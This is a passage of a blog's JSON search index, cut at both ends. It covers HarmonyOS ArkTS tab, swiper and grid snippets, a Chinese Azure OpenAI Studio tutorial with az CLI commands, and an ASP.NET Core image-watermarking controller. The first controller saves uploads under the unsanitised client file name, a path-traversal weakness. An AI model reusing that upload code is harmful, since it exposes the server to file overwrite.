服务资源，并且是 Azure AI 服务的一部分。","title":"Azure OpenAI Natural Language"},{"content":"🔮Tabs Tabs(){ TabContent(){ } } example\nTabs({barPosition:BarPosition.End}){ ForEach(this.ilist,(item,index)=\u0026gt;{ TabContent(){ Column( ){ Text(item.title) .fontSize(\u0026#39;18fp\u0026#39;) } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .backgroundColor(\u0026#39;#FFFFFF\u0026#39;) } .tabBar(this.tabTile(index,item.title,item.url1,item.url2)) }) } .vertical(false) .scrollable(true)//huadong .animationDuration(400) .width(\u0026#39;100%\u0026#39;) .backgroundColor(\u0026#39;#fffff1\u0026#39;) //.height(\u0026#39;100vp\u0026#39;) .onChange((value) =\u0026gt; { this.curIndex = value; }) 🎮️tab data interface INav{ title:string; url1:Resource; url2 :Resource; } //... @State ilist:INav[]=[{ title:\u0026#39;index\u0026#39;, url1:$r(\u0026#39;app.media.icon\u0026#39;), url2:$r(\u0026#39;app.media.icon2\u0026#39;) }, { title:\u0026#39;hot\u0026#39;, url1:$r(\u0026#39;app.media.icon\u0026#39;), url2:$r(\u0026#39;app.media.icon2\u0026#39;) }, { title:\u0026#39;my\u0026#39;, url1:$r(\u0026#39;app.media.icon\u0026#39;), url2:$r(\u0026#39;app.media.icon2\u0026#39;) } ]; barPosition:BarPosition.End 底部\nbarPosition:BarPosition.Start 顶部\n🪅Component swpier @Component export default struct swiper1{ public ilist:Array\u0026lt;Resource\u0026gt; =[ $r(\u0026#39;app.media.22222\u0026#39;), $r(\u0026#39;app.media.11111\u0026#39;), $r(\u0026#39;app.media.22222\u0026#39;) ] build(){ Column(){ Swiper(){ ForEach(this.ilist,(item,index)=\u0026gt;{ Image(item).width(\u0026#39;98%\u0026#39;).height(\u0026#39;160vp\u0026#39;) }) } .autoPlay(true) .interval(3000) .duration(400) .indicator(true) .itemSpace(5) } } } add img\u0026hellip;\nindex import\nswipert() .height(\u0026#39;80%\u0026#39;) .margin(\u0026#39;10vp\u0026#39;) 🎰Component nav Grid interface inavit { title:string, img:Resource } @Component export default struct homenav{ public ilist:Array\u0026lt;inavit\u0026gt; =[ {title:\u0026#39;w\u0026#39;,img: $r(\u0026#39;app.media.110\u0026#39;)}, {title:\u0026#39;z\u0026#39;,img: $r(\u0026#39;app.media.111\u0026#39;)}, {title:\u0026#39;r\u0026#39;,img: $r(\u0026#39;app.media.120\u0026#39;)}, {title:\u0026#39;y\u0026#39;,img: $r(\u0026#39;app.media.129\u0026#39;)}, {title:\u0026#39;j\u0026#39;,img: $r(\u0026#39;app.media.140\u0026#39;)}, {title:\u0026#39;y\u0026#39;,img: $r(\u0026#39;app.media.150\u0026#39;)}, {title:\u0026#39;c\u0026#39;,img: $r(\u0026#39;app.media.163\u0026#39;)}, {title:\u0026#39;j\u0026#39;,img: $r(\u0026#39;app.media.173\u0026#39;)} ] build(){ Column(){ Grid(){ ForEach(this.ilist,(item:inavit,index:number)=\u0026gt;{ GridItem(){ Column({space:5}){ Image(item.img).width(\u0026#39;50vp\u0026#39;).height(\u0026#39;50vp\u0026#39;) Text(item.title).fontSize(\u0026#39;18fp\u0026#39;) } } }) } .columnsTemplate(\u0026#39;1fr 1fr 1fr 1fr\u0026#39;) .rowsGap(\u0026#39;10\u0026#39;) .margin(\u0026#39;10\u0026#39;) //.backgroundColor() } } } index import\nhomenav1() .height(\u0026#39;60%\u0026#39;) 🕹️Component List @Component export default struct homelist{ build(){ Column(){ List() { ListItem(){ Image($r(\u0026#39;app.media.666\u0026#39;)) .objectFit(ImageFit.Cover) .aspectRatio(2.7) .margin(\u0026#39;10vp\u0026#39;) } ListItem(){ Image($r(\u0026#39;app.media.777\u0026#39;)) .objectFit(ImageFit.Cover) .aspectRatio(2.7) .margin(\u0026#39;10vp\u0026#39;) } } // Text(\u0026#39;hhhh\u0026#39;) } } } Err does not meet UI component syntax. 组件声明错误\n","permalink":"https://qfsyso.github.io/posts/harmonyos-tabs-component/","summary":"🔮Tabs Tabs(){ TabContent(){ } } example\nTabs({barPosition:BarPosition.End}){ ForEach(this.ilist,(item,index)=\u0026gt;{ TabContent(){ Column( ){ Text(item.title) .fontSize(\u0026#39;18fp\u0026#39;) } .width(\u0026#39;100%\u0026#39;) .height(\u0026#39;100%\u0026#39;) .backgroundColor(\u0026#39;#FFFFFF\u0026#39;) } .tabBar(this.tabTile(index,item.title,item.url1,item.url2)) }) } .vertical(false) .scrollable(true)//huadong .animationDuration(400) .width(\u0026#39;100%\u0026#39;) .backgroundColor(\u0026#39;#fffff1\u0026#39;) //.height(\u0026#39;100vp\u0026#39;) .onChange((value) =\u0026gt; { this.curIndex = value; }) 🎮️tab data interface INav{ title:string; url1:Resource; url2 :Resource; } //... @State ilist:INav[]=[{ title:\u0026#39;index\u0026#39;, url1:$r(\u0026#39;app.media.icon\u0026#39;), url2:$r(\u0026#39;app.media.icon2\u0026#39;) }, { title:\u0026#39;hot\u0026#39;, url1:$r(\u0026#39;app.media.icon\u0026#39;), url2:$r(\u0026#39;app.media.icon2\u0026#39;) }, { title:\u0026#39;my\u0026#39;, url1:$r(\u0026#39;app.media.icon\u0026#39;), url2:$r(\u0026#39;app.media.icon2\u0026#39;) } ]; barPosition:BarPosition.End 底部\nbarPosition:BarPosition.Start 顶部\n🪅Component swpier @Component export default struct swiper1{ public ilist:Array\u0026lt;Resource\u0026gt; =[ $r(\u0026#39;app.","title":" HarmonyOS Tabs Component"},{"content":"开始使用 Azure OpenAI 服务 简介 假设你想要生成一个汇总文本和建议代码的支持应用程序。 若要生成此应用，需要利用 ChatGPT 中显示的功能，ChatGPT 是 OpenAI 研究公司构建的聊天机器人，它接受用户的自然语言输入，并返回机器创建的类人响应。\n生成式 AI 模型支持 ChatGPT 基于自然语言提示生成新内容（如文本、代码和图像）的能力。 许多生成 AI 模型是深度学习算法的子集。 这些算法支持视觉、语音、语言、决策、搜索等各种工作负载。\nAzure OpenAI 服务将这些生成式 AI 模型引入 Azure 平台，使你能够开发功能强大的 AI 解决方案，这些解决方案受益于 Azure 云平台提供的其他服务的安全性、可伸缩性和集成。 这些模型可用于通过 REST API、各种 SDK 和 Studio 接口生成应用程序。 本模块将指导你完成 Azure OpenAI Studio 体验，为你使用生成式 AI 进一步开发解决方案奠定了基础。\n访问 Azure OpenAI 服务 使用 Azure OpenAI 构建生成型 AI 解决方案的第一步是在 Azure 订阅中预配 Azure OpenAI 资源。 Azure OpenAI 服务目前处于受限访问状态。 用户需要在 https://aka.ms/oai/access 上申请服务访问权限。\n注意\nAzure OpenAI 服务已发布，但支持以合乎道德的方式使用该服务的访问权限有限。 可以在此处阅读 Azure OpenAI 服务的 Microsoft 透明度说明。\n有权访问 Azure OpenAI 服务后，可以通过在 Azure 门户中创建资源或使用 Azure 命令行接口 (CLI) 开始。\n在 Azure 门户中创建 Azure OpenAI 服务资源 创建 Azure OpenAI 服务资源时，需要提供订阅名称、资源组名称、区域、唯一实例名称，并选择定价层。 在 Azure CLI 中创建 Azure OpenAI 服务资源 若要从 CLI 创建 Azure OpenAI 服务资源，请参阅此示例，并将以下变量替换为自己的变量：\nMyOpenAIResource：替换为资源的唯一名称 OAIResourceGroup：替换为资源组名称 eastus：替换为要部署资源的区域 subscriptionID：替换为订阅 ID az cognitiveservices account create \\ -n MyOpenAIResource \\ -g OAIResourceGroup \\ -l eastus \\ --kind OpenAI \\ --sku s0 \\ --subscription subscriptionID 注意\n可以通过 CLI 命令 az account list-locations 查找可用于服务的区域。 若要了解如何通过 CLI 登录到 Azure 并创建 Azure 组，请参阅此处的文档。\n区域可用性 Azure OpenAI 服务提供了对多种类型的模型的访问。 某些模型仅在选定区域中可用。 有关区域可用性，请参阅 Azure OpenAI 模型可用性指南。 可以为每个区域创建两个 Azure OpenAI 资源。\nAzure OpenAI Studio 提供对模型管理、部署、试验、自定义和学习资源的访问权限。\n创建资源后，可以通过 Azure 门户访问 Azure OpenAI Studio，也可以在 https://oai.azure.com 通过使用 Azure OpenAI 资源实例登录来访问 Azure OpenAI Studio。 在登录工作流中，选择适当的目录、Azure 订阅和 Azure OpenAI 资源。\n首次打开 Azure OpenAI Studio 时，屏幕顶部会显示一个“行动号召”按钮，用于部署第一个模型。 选择创建新部署的选项会打开“部署”页，从中可以部署基础模型并开始试验。\n探索生成式 AI 模型的类型 若要开始使用 Azure OpenAI 进行生成，需要选择一个基础模型并进行部署。 Microsoft 提供基础模型以及创建自定义基础模型的选项。 本模块介绍当前可用的基础模型。\nAzure OpenAI 包括多种类型的模型：\nGPT-4 模型是最新一代的生成式预训练 (GPT) 模型，可以根据自然语言提示生成自然语言和代码补全。 GPT 3.5 模型可以根据自然语言提示生成自然语言和代码补全。 具体而言，GPT-35-turbo 模型针对基于聊天的交互进行了优化，在大多数生成式 AI 方案中都表现良好。 嵌入模型将文本转换为数字向量，并且在语言分析方案（例如比较文本源的相似性）中非常有用。 DALL-E 模型用于基于自然语言提示生成图像。 目前，DALL-E 模型处于预览阶段。 DALL-E 模型未在 Azure OpenAI Studio 界面中列出，并且不需要显式部署。 模型因速度、成本和完成特定任务的出色程度而异。 可以详细了解 Azure OpenAI 服务文档中介绍的差异和最新模型。\n注意\n定价由令牌和模型类型决定。 在此处详细了解最新定价。\n在 Azure OpenAI Studio 中，“模型”页列出了可用的基础模型（DALL-E 模型除外），并提供了通过微调基本模型来创建其他自定义模型的选项。 模型状态为“成功”意味着它们已成功训练，并且可被选择用于部署。\n部署生成式 AI 模型 首先需要部署一个模型，以便进行 API 调用，从而接收提示完成。 创建新部署时，需要指出要部署的基础模型。 可以在一个或多个 Azure OpenAI 资源中实现任意数量的部署，只要它们的 TPM 总数在那个区域中低于 240K。 可通过多种方式部署基础模型。\n使用 Azure OpenAI Studio 进行部署 在 Azure OpenAI Studio 的“部署”页中，可以通过从菜单中选择模型名称来创建新部署。 可用的基础模型来自模型页中的列表。\n在 Studio 的“部署”页中，还可以查看所有部署的相关信息，包括部署名称、模型名称、模型版本、状态、创建日期等。\n使用 Azure CLI 进行部署 还可以使用控制台部署模型。 使用此示例，将以下变量替换为自己的资源值：\nOAIResourceGroup：替换为资源组名称 MyOpenAIResource：替换为资源名称 MyModel：替换为模型的唯一名称 gpt-35-turbo：替换为要部署的基础模型 az cognitiveservices account deployment create \\ -g OAIResourceGroup \\ -n MyOpenAIResource \\ --deployment-name MyModel \\ --model-name gpt-35-turbo \\ --model-version \u0026#34;0301\u0026#34; \\ --model-format OpenAI \\ --sku-name \u0026#34;Standard\u0026#34; \\ --sku-capacity 1 使用 REST API 进行部署 可以使用 REST API 部署模型。 在请求正文中，指定要部署的基础模型。 请参阅 Azure OpenAI 文档中的示例。\n使用提示从模型完成 部署模型后，可以测试其完成提示的方式。 提示是发送到部署模型的完成终结点的请求的文本部分。 响应被称为完成，可以采用文本、代码的形式或其他形式。\n提示类型 可以根据任务将提示分组为请求类型。\n| 任务类型 | 提示示例 | 完成示例 | | +++ | +++ | +++ | | 对内容进行分类 | Tweet：我喜欢这次旅行。\n情绪: | 正 | | 生成新内容 | 列出旅行方式 | 1.骑行\n2. 乘车 \u0026hellip; | | 进行对话 | 友好的 AI 助手 | 请参见示例 | | 转换（转换和符号转换） | 英语：你好\n法语： | bonjour | | 汇总内容 | 提供内容总结\n{text} | 机器学习的内容共享方法。 | | 从离开的位置继续 | 种植西红柿的一种方法 | 就是播种种子。 | | 提供事实答复 | 地球拥有多少颗卫星？ | 一种 |\n完成质量 有几个因素会影响从生成式 AI 解决方案中获得的完成质量。\n提示的工程处理方式。 单击此处详细了解提示工程。 模型参数（下文将介绍） 训练模型的数据，可以通过自定义模型微调进行调整 与通过提示工程和参数调整相比，你可以通过训练自定义模型更好地控制返回的完成。\n发起呼叫 可以通过 REST API、Python、C# 或从 Studio 开始调用部署的模型。 如果部署的模型具有 GPT-3.5 或 GPT-4 模型库，请使用聊天完成文档，该文档具有与其他基础模型不同的请求终结点和变量。\n在 Azure OpenAI Studio 的操场中测试模型 操场是 Azure OpenAI Studio 中的有用接口，可用于试验部署的模型，而无需开发自己的客户端应用程序。 Azure OpenAI Studio 提供了具有不同参数优化选项的多个操场。\n完成操场 完成操场允许你通过文本输入文本输出接口调用部署的模型，并调整参数。 你需要在“部署”下选择模型的部署名称。 （可选）可以使用提供的示例入门，然后输入自己的提示。\n完成操场参数 可以调整许多参数来更改模型的性能：\n温度：控制随机性。 降低温度意味着模型会产生更多重复性和确定性的回复。 提高温度会导致更多意外或创造性的回复。 请尝试调整温度或 Top P 值，但不要同时调整两者。 最大长度(标记数)：对每个模型响应的标记数设置限制。 该 API 支持最多 4000 个标记，包括提示（包括系统消息、示例、消息历史记录以及用户查询）和模型的响应。 对于典型的英文文本，一个标记大约是四个字符。 停止序列：使响应停止在所需点，例如句子或列表的末尾。 指定最多四个序列，模型将停止在响应中生成更多标记。 返回的文本不包含停止序列。 最高概率(最高 P)：与温度类似，它控制着随机性，但使用不同的方法。 降低 Top P 值会将模型的标记选择范围缩小到可能性更高的标记。 增加 Top P 值会使模型既选择可能高的标记又选择可能性低的标记。 请尝试调整温度或 Top P 值，但不要同时调整两者。 频率处罚：根据标记在文本中出现的频率，按比例降低标记重复的可能性。 这会降低在响应中重复完全相同文本的可能性。 存在处罚：降低到目前为止在文本中出现的任何标记重复的可能性。 这会增加在响应中引入新主题的可能性。 响应前文本：在用户输入之后和模型响应之前插入文本。 这有助于为响应准备模型。 响应后文本：在模型生成的响应之后插入文本以鼓励进一步的用户输入，就像对话建模一样。 聊天操场 聊天操场基于对话传入消息传出界面。 可以使用系统消息初始化会话以设置聊天上下文。\n在聊天操场中，可以添加少样本示例。 “少样本”一词是指提供几个示例来帮助模型了解它需要执行的操作。 可以将其与零样本（指不提供任何示例）进行对比。\n在助手设置中，可以提供用户输入和助手响应的少样本示例。 助手会尝试以你在系统消息中定义的语气、规则和格式来模拟这里包含的响应。\n聊天操场参数 “完成”操场等“聊天”操场还包括温度参数。 “聊天”操场还支持“完成”操场中不可用的其他参数。 其中包括：\n最大响应：对每个模型响应的标记数设置限制。 该 API 支持最多 4000 个标记，包括提示（包括系统消息、示例、消息历史记录以及用户查询）和模型的响应。 对于典型的英文文本，一个标记大约是四个字符。 最高 P：与温度类似，它控制着随机性，但使用不同的方法。 降低 Top P 值会将模型的标记选择范围缩小到可能性更高的标记。 增加 Top P 值会使模型既选择可能高的标记又选择可能性低的标记。 请尝试调整温度或 Top P 值，但不要同时调整两者。 包含的过去消息数：选择要包含在每个新 API 请求中的过去消息数。 包含过去的消息有助于为新用户查询提供模型上下文。 将此数字设置为 10 将包含 5 个用户查询和 5 个系统响应。 可以在聊天操场中查看“当前标记计数”。 由于 API 调用按标记定价，并且可以设置最大响应标记限制，因此需要留意当前标记计数，以确保对话不会超过最大响应标记计数。\n练习 - 开始使用 Azure OpenAI 服务 已完成\n现在，你有机会在 Azure OpenAI Studio 中部署和管理模型。 在本练习中，你将部署 Azure OpenAI 基础模型，并在完成和聊天操场中测试它们。 你将有机会了解提示和参数对文本和代码完成的影响。\n注意\n为了完成此实验室，你将需要一个 Azure 订阅。 还需要注册 Azure OpenAI 访问权限才能完成此实验室。\n要完成本模块的练习，请启动 VM 并按照说明操作。\n注意\n若要完成此练习，你将需要 Microsoft Azure 订阅。 如果你还没有该订阅，可以注册一个。\n如果需要为此练习设置计算机，可以使用此设置指南，然后按照下面链接的练习说明进行操作。 请注意，设置指南适用于多个开发练习，其中可能包括该特定练习不需要的软件。 此外，由于可能的操作系统和设置配置的范围太广，如果你选择在自己的计算机上完成此练习，我们将无法提供支持。\n要在自己的计算机上按照这些说明进行操作，可以按照此处的练习说明进行操作。\n提示\n完成练习后，如果你已完成对 Azure AI 服务的学习，请删除在练习期间创建的 Azure 资源。\n","permalink":"https://qfsyso.github.io/posts/azure-openai-solution/","summary":"开始使用 Azure OpenAI 服务 简介 假设你想要生成一个汇总文本和建议代码的支持应用程序。 若要生成此应用，需要利用 ChatGPT 中显示的功能，ChatGPT 是 OpenAI 研究公司构建的聊天机器人，它接受用户的自然语言输入，并返回机器创建的类人响应。\n生成式 AI 模型支持 ChatGPT 基于自然语言提示生成新内容（如文本、代码和图像）的能力。 许多生成 AI 模型是深度学习算法的子集。 这些算法支持视觉、语音、语言、决策、搜索等各种工作负载。\nAzure OpenAI 服务将这些生成式 AI 模型引入 Azure 平台，使你能够开发功能强大的 AI 解决方案，这些解决方案受益于 Azure 云平台提供的其他服务的安全性、可伸缩性和集成。 这些模型可用于通过 REST API、各种 SDK 和 Studio 接口生成应用程序。 本模块将指导你完成 Azure OpenAI Studio 体验，为你使用生成式 AI 进一步开发解决方案奠定了基础。\n访问 Azure OpenAI 服务 使用 Azure OpenAI 构建生成型 AI 解决方案的第一步是在 Azure 订阅中预配 Azure OpenAI 资源。 Azure OpenAI 服务目前处于受限访问状态。 用户需要在 https://aka.ms/oai/access 上申请服务访问权限。\n注意\nAzure OpenAI 服务已发布，但支持以合乎道德的方式使用该服务的访问权限有限。 可以在此处阅读 Azure OpenAI 服务的 Microsoft 透明度说明。","title":"Azure OpenAI Solution"},{"content":"controller [HttpPost] public async Task\u0026lt;IActionResult\u0026gt; AddWatermark(IFormFile file, string watermarkText, string color, int transparency) { if (file != null \u0026amp;\u0026amp; file.Length \u0026gt; 0) { // 将上传的文件保存到服务器 var uploads = Path.Combine(_environment.WebRootPath, \u0026#34;uploads\u0026#34;); if (!Directory.Exists(uploads)) { Directory.CreateDirectory(uploads); } var filePath = Path.Combine(uploads, file.FileName); using (var fileStream = new FileStream(filePath, FileMode.Create)) { await file.CopyToAsync(fileStream); } // 添加水印 using (Image image = Image.FromFile(filePath)) using (Graphics g = Graphics.FromImage(image)) { // 设置水印文本的字体和颜色 Font font = new Font(\u0026#34;Arial\u0026#34;, 20); Color colorValue = ColorTranslator.FromHtml(color); SolidBrush brush = new SolidBrush(Color.FromArgb(transparency, colorValue.R, colorValue.G, colorValue.B)); // 计算水印位置 int x = 10; int y = image.Height - 30; // 绘制水印 g.DrawString(watermarkText, font, brush, new PointF(x, y)); // 保存带水印的图片 var newFileName = \u0026#34;watermarked_\u0026#34; + file.FileName; var newFilePath = Path.Combine(uploads, newFileName); image.Save(newFilePath, ImageFormat.Jpeg); // 返回带水印的图片路径 ViewBag.ImagePath = \u0026#34;/uploads/\u0026#34; + newFileName; } } return View(\u0026#34;Index\u0026#34;); } views @{ ViewBag.Title = \u0026#34;Home Page\u0026#34;; } \u0026lt;h2\u0026gt;图片加水印\u0026lt;/h2\u0026gt; \u0026lt;form action=\u0026#34;/Home/AddWatermark\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;file\u0026#34;\u0026gt;选择图片：\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; id=\u0026#34;file\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;watermarkText\u0026#34;\u0026gt;水印文字：\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;watermarkText\u0026#34; id=\u0026#34;watermarkText\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;color\u0026#34;\u0026gt;水印颜色：\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;color\u0026#34; name=\u0026#34;color\u0026#34; id=\u0026#34;color\u0026#34; value=\u0026#34;#000000\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;transparency\u0026#34;\u0026gt;透明度：\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;range\u0026#34; name=\u0026#34;transparency\u0026#34; id=\u0026#34;transparency\u0026#34; min=\u0026#34;0\u0026#34; max=\u0026#34;255\u0026#34; value=\u0026#34;128\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;上传并添加水印\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; @if (ViewBag.ImagePath != null) { \u0026lt;h3\u0026gt;带水印的图片：\u0026lt;/h3\u0026gt; \u0026lt;img src=\u0026#34;@ViewBag.ImagePath\u0026#34; alt=\u0026#34;Watermarked Image\u0026#34; /\u0026gt; } Uploads folder Uploads\nPosition TranslateTransform [HttpPost] public async Task\u0026lt;IActionResult\u0026gt; AddWatermark(IFormFile file, string watermarkText, string color, int transparency, string position, int angle) { if (file != null \u0026amp;\u0026amp; file.Length \u0026gt; 0) { // 将上传的文件保存到服务器 var uploads = Path.Combine(_environment.WebRootPath, \u0026#34;uploads\u0026#34;); if (!Directory.Exists(uploads)) { Directory.CreateDirectory(uploads); } var filePath = Path.Combine(uploads, file.FileName); using (var fileStream = new FileStream(filePath, FileMode.Create)) { await file.CopyToAsync(fileStream); } // 添加水印 using (Image image = Image.FromFile(filePath)) using (Graphics g = Graphics.FromImage(image)) { // 设置水印文本的字体和颜色 Font font = new Font(\u0026#34;Arial\u0026#34;, 20); Color colorValue = ColorTranslator.FromHtml(color); SolidBrush brush = new SolidBrush(Color.FromArgb(transparency, colorValue.R, colorValue.G, colorValue.B)); // 计算水印位置 PointF point = CalculateWatermarkPosition(position, image, g, watermarkText, font); // 旋转水印 g.TranslateTransform(point.X, point.Y); g.RotateTransform(angle); g.DrawString(watermarkText, font, brush, 0, 0); g.ResetTransform(); // 保存带水印的图片 var newFileName = \u0026#34;watermarked_\u0026#34; + file.FileName; var newFilePath = Path.Combine(uploads, newFileName); image.Save(newFilePath, ImageFormat.Jpeg); // 返回带水印的图片路径 ViewBag.ImagePath = \u0026#34;/uploads/\u0026#34; + newFileName; } } return View(\u0026#34;Index\u0026#34;); } private PointF CalculateWatermarkPosition(string position, Image image, Graphics g, string text, Font font) { SizeF textSize = g.MeasureString(text, font); float x = 0; float y = 0; switch (position.ToLower()) { case \u0026#34;topleft\u0026#34;: x = 10; y = 10; break; case \u0026#34;topright\u0026#34;: x = image.Width - textSize.Width - 10; y = 10; break; case \u0026#34;center\u0026#34;: x = (image.Width - textSize.Width) / 2; y = (image.Height - textSize.Height) / 2; break; case \u0026#34;bottomleft\u0026#34;: x = 10; y = image.Height - textSize.Height - 10; break; case \u0026#34;bottomright\u0026#34;: x = image.Width - textSize.Width - 10; y = image.Height - textSize.Height - 10; break; } return new PointF(x, y); } change view \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;position\u0026#34;\u0026gt;水印位置：\u0026lt;/label\u0026gt; \u0026lt;select name=\u0026#34;position\u0026#34; id=\u0026#34;position\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;topleft\u0026#34;\u0026gt;左上\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;topright\u0026#34;\u0026gt;右上\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;center\u0026#34;\u0026gt;居中\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;bottomleft\u0026#34;\u0026gt;左下\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;bottomright\u0026#34;\u0026gt;右下\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;angle\u0026#34;\u0026gt;倾斜角度：\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;number\u0026#34; name=\u0026#34;angle\u0026#34; id=\u0026#34;angle\u0026#34; value=\u0026#34;0\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; multiple [HttpPost] public async Task\u0026lt;IActionResult\u0026gt; AddWatermarkMore(List\u0026lt;IFormFile\u0026gt; files, string watermarkText, string color, int transparency, string position, int angle) { var watermarkedPaths = new List\u0026lt;string\u0026gt;(); foreach (var file in files) { if (file != null \u0026amp;\u0026amp; file.Length \u0026gt; 0) { // 将上传的文件保存到服务器 var uploads = Path.Combine(_environment.WebRootPath, \u0026#34;uploads\u0026#34;); if (!Directory.Exists(uploads)) { Directory.CreateDirectory(uploads); } // 生成基于时间戳和随机数的文件名 var fileName = $\u0026#34;{DateTime.Now:yyyyMMddHHmmss}_{Guid.NewGuid().ToString().Substring(0, 8)}{Path.GetExtension(file.FileName)}\u0026#34;; var filePath = Path.Combine(uploads, fileName); using (var fileStream = new FileStream(filePath, FileMode.Create)) { await file.CopyToAsync(fileStream); } // 添加水印 using (Image image = Image.FromFile(filePath)) using (Graphics g = Graphics.FromImage(image)) { // 设置水印文本的字体和颜色 Font font = new Font(\u0026#34;Arial\u0026#34;, 20); Color colorValue = ColorTranslator.FromHtml(color); SolidBrush brush = new SolidBrush(Color.FromArgb(transparency, colorValue.R, colorValue.G, colorValue.B)); // 计算水印位置 PointF point = CalculateWatermarkPosition(position, image, g, watermarkText, font); // 旋转水印 g.TranslateTransform(point.X, point.Y); g.RotateTransform(angle); g.DrawString(watermarkText, font, brush, 0, 0); g.ResetTransform(); // 保存带水印的图片 var newFileName = $\u0026#34;watermarked_{fileName}\u0026#34;; var newFilePath = Path.Combine(uploads, newFileName); image.Save(newFilePath, ImageFormat.Jpeg); // 添加水印路径到列表 watermarkedPaths.Add(\u0026#34;/uploads/\u0026#34; + newFileName); } } } ViewBag.ImagePaths = watermarkedPaths; return View(\u0026#34;Index\u0026#34;); } change view \u0026lt;h2\u0026gt;图片加水印\u0026lt;/h2\u0026gt; \u0026lt;form action=\u0026#34;/Home/AddWatermark\u0026#34; method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;files\u0026#34;\u0026gt;选择图片：\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;files\u0026#34; id=\u0026#34;files\u0026#34; multiple /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;watermarkText\u0026#34;\u0026gt;水印文字：\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;watermarkText\u0026#34; id=\u0026#34;watermarkText\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;color\u0026#34;\u0026gt;水印颜色：\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;color\u0026#34; name=\u0026#34;color\u0026#34; id=\u0026#34;color\u0026#34; value=\u0026#34;#000000\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;transparency\u0026#34;\u0026gt;透明度：\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;range\u0026#34; name=\u0026#34;transparency\u0026#34; id=\u0026#34;transparency\u0026#34; min=\u0026#34;0\u0026#34; max=\u0026#34;255\u0026#34; value=\u0026#34;128\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;position\u0026#34;\u0026gt;水印位置：\u0026lt;/label\u0026gt; \u0026lt;select name=\u0026#34;position\u0026#34; id=\u0026#34;position\u0026#34;\u0026gt; \u0026lt;option value=\u0026#34;topleft\u0026#34;\u0026gt;左上\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;topright\u0026#34;\u0026gt;右上\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;center\u0026#34;\u0026gt;居中\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;bottomleft\u0026#34;\u0026gt;左下\u0026lt;/option\u0026gt; \u0026lt;option value=\u0026#34;bottomright\u0026#34;\u0026gt;右下\u0026lt;/option\u0026gt; \u0026lt;/select\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;label for=\u0026#34;angle\u0026#34;\u0026gt;倾斜角度：\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;number\u0026#34; name=\u0026#34;angle\u0026#34; id=\u0026#34;angle\u0026#34; value=\u0026#34;0\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34;\u0026gt;上传并添加水印\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; @if (ViewBag.ImagePaths != null) { \u0026lt;h3\u0026gt;带水印的图片：\u0026lt;/h3\u0026gt; @foreach (var imagePath in ViewBag.ImagePaths) { \u0026lt;div\u0026gt; \u0026lt;img src=\u0026#34;@imagePath\u0026#34; alt=\u0026#34;Watermarked Image\u0026#34; style=\u0026#34;max-width: 100%; height: auto;\u0026#34; /\u0026gt; \u0026lt;/div\u0026gt; } } ","permalink":"https://qfsyso.github.io/posts/.net-addwatermark/","summary":"controller [HttpPost] public async Task\u0026lt;IActionResult\u0026gt; AddWatermark(IFormFile file, string watermarkText, string color, int transparency) { if (file != null \u0026amp;\u0026amp; file.Length \u0026gt; 0) { // 将上传的文件保存到服务器 var uploads = Path.Combine(_environment.WebRootPath, \u0026#34;uploads\u0026#34;); if (!Directory.Exists(uploads)) { Directory.CreateDirectory(uploads); } var filePath = Path.Combine(uploads, file.FileName); using (var fileStream = new FileStream(filePath, FileMode.Create)) { await file.CopyToAsync(fileStream); } // 添加水印 using (Image image = Image.FromFile(filePath)) using (Graphics g = Graphics.FromImage(image)) { // 设置水印文本的字体和颜色 Font font = new Font(\u0026#34;Arial\u0026#34;, 20); Color colorValue = ColorTranslator.","title":".NET AddWatermark"},{"content":"📚Dockerfile FROM mcr.microsoft.com/dotnet/sdk:8.0 AS build WORKDIR /src COPY 